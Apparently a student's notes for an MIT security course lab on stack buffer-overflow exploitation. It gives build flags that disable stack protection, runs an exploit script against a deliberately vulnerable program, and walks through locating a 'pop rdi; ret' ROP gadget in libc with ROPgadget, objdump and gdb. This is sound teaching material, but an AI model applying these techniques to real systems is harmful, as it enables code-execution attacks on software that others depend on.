`exploit.py` and `vulnerable.c` are from blog

usage:
```
cc -m64   -c -o shellcode.o shellcode.S

objcopy -S -O binary -j .text shellcode.o shellcode.bin

gcc -g -fno-stack-protector -z execstack vulnerable.c -o vulnerable -D_FORTIFY_SOURCE=0

./exploit.py | env - setarch -R ./vulnerable
```

## exploit-challenge:

### look up useful gadget(advised by hint: `pop %rdi; ret`) 
input:
```
ROPgadget --binary  /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" | grep 'pop rdi'
```

output:
```
0x000000000002a3e5 : pop rdi ; ret
```
gadget addr: `0x000000000002a3e5`

### objdump look up `.text`
input:
```
objdump -h /lib/x86_64-linux-gnu/libc.so.6 | grep text
```

output:
```
14 .text         0019223d  0000000000028700  0000000000028700  00028700  2**6
```
.text begin address is `0x0000000000028700`



### gdb -p $(pgrep zookd)
input:
```
info files
```
output:
```
0x000015555530a700 - 0x000015555549c93d is .text in /lib/x86_64-linux-gnu/libc.so.6
```

### compute instruction mapping: libc => executable
```
0x000015555530a700: base .text addr of libc in runtime 
0x000000000002a3e5: static addr of 'pop %rdi; ret' in libc
0x0000000000028700: static begin addr of .text in libc

addr of 'pop %rdi; ret' in runtime:
0x000015555530a700 + (0x000000000002a3e5 - 0x0000000000028700) = 0x15555530c3e5
```

### gdb attach to verify:
input:
```
x/2b 0x15555530c3e5
```

output:
```
0x15555530c3e5 <iconv+197>:     0x5f    0xc3
```

input:
```
x/2i 0x15555530c3e5
```

output:
```
0x15555530c3e5 <iconv+197>:  pop    %rdi
0x15555530c3e6 <iconv+198>:  ret  
```

Original text: https://css.csail.mit.edu/6.5660/2024/labs/lab1.html

Because of the nature of x86/x86-64, you can use another technique to find sequences of instructions that don't even appear in the disassembly! Instructions are variable-length (from 1 to 15 bytes), and by causing a misaligned parse (by jumping into the middle of an intended instruction), you can cause a sequence of machine code to be misinterpreted. For example, the instruction sequence `pop %r15; ret` corresponds to the machine code `41 5F C3`. But instead of executing from the start of this instruction stream, if you jump 1 byte in, the machine code `5F C3` corresponds to the assembly `pop %rdi; ret`.